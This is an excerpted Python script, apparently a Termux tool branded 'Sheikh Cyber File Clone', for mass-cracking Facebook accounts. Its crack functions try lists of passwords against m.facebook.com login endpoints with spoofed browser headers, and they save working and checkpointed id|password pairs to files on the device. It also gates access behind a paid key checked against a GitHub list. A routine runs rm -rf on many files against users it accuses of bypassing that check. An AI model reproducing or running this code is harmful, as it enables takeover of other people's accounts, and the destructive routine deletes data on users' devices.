...
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY FACEBOOK GROUP𝐞")
os.system('espeak -a 300 " FOLLOW MY FACEBOOK GROUP"')
time.sleep(2)
os.system(f'xdg-open https://m.facebook.com/groups/1311653583047186/?ref=share&mibextid=NSMWBT')
time.sleep(5)
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY FACBOOK PAGE")
os.system('espeak -a 300 " FOLLOW MY FACBOOK PAGE"')
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=61551797355201')
...
def back():
    login()
def contact():
    os.system('xdg-open https://m.facebook.com/groups/1311653583047186/?ref=share&mibextid=NSMWBT')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
---------------------------------------------
 💔💔💔 WELCOME TO Sheikh Cyber TOOLS💔💔💔     
---------------------------------------------
╔══════════════════════════════════════════╗🖤
║Author     : Sheikh Cyber
║Facebook   : Khorsed Sheikh
║Page       : Termux Sheikh Cyber
║Tool       : File Clone
║Version    : 0.5                     
╚══════════════════════════════════════════╝💔 """
os.system('clear')
...
#####os.system('espeak -a 300 " WELCOME TO SHEIKH CYBER  FILE CLONING TOOLS"')
pass
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Khorsed12/File-Clone/blob/main/Approval').text
    if id in httpCaht:
      ...
      tks = ('AssalamuAlaylum%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('xdg-open https://wa.me/message/J5NBZXOPOHGYP1?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
ball='/data/data/com.termux/files/usr/bin/fboot'
SHEIKH='/sdcard/Android/.maidx.txt'
SHEIKH2='/sdcard/.brab.txt'
SHEIKH3='/data/data/com.termux/files/usr/bin/.sdghkrh'
def fucked():
    print(' Server Loadin.......')
    ...
    os.system(f"rm -rf {SHEIKH}")
    os.system(f"rm -rf {SHEIKH2}")
    os.system(f"rm -rf {SHEIKH3}")
    os.system(f"rm -rf {l}")
    os.system(f"rm -rf {m}")
    os.system(f"rm -rf {n}")
    os.system(f"rm -rf {o}")
    ...
    os.system(f"rm -rf {y}")
    os.system(f"rm -rf {z}")
    print(' Fuck You Bypass User Security By SHEIKH CYBER');exit()

def ckx():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    server = requests.get(f'https://github.com/Khorsed12/File-Clone/blob/main/Approval').text
    try:
        httpCaht = requests.get(f"https://github.com/Khorsed12/File-Clone/blob/main/Approval").text
        if id in httpCaht:
            msg = str(os.geteuid())
            #pass
        else:
...
╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝            """)
    ...
    while attempts < max_attempts:
        access_key = input('\033[1;32m┏━➤\033[1;32m Enter Access Key: ')
...
def menu():
    ...
    print('\033[0;97m=========================================================')
    print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[1;30mFile clone         """)
    ...
    if SHEIKH in ['111']:
        ...
        os.system('xdg-open https://wa.me/message/J5NBZXOPOHGYP1')
        os.system("python FUCK.py")
    elif SHEIKH in ['3','03']:
        result()
    elif SHEIKH in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Sheikh.txt  Etc...]')
...
def setting():
    print('\033[0;91m=========================================================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mCLONING FOR MIX IDz")
    print('\033[0;91m=========================================================')
    ...
    print(logo)
    print('\033[0;91m=========================================================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] M1")
    print('\033[0;91m=========================================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;91m{bo}[Sheikh🤪<M1>]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                open('/sdcard/M1•SHEIKH-CP.txt', 'a').write( uid+' | '+ps+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Sheikh🤪<M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•CP] {idf} • {pw}')
                os.system('espeak -a 300 " oh shit Cp ID"')
                open('/sdcard/M2•SHEIKH-CP.txt', 'a').write( uid+' | '+ps+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•OK 😍] {idf} • {pw} ')
                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  AN,  OK,  id"')
                open('/sdcard/M2•Sheikh-OK.txt', 'a').write( uid+' | '+ps+'\n')
                break
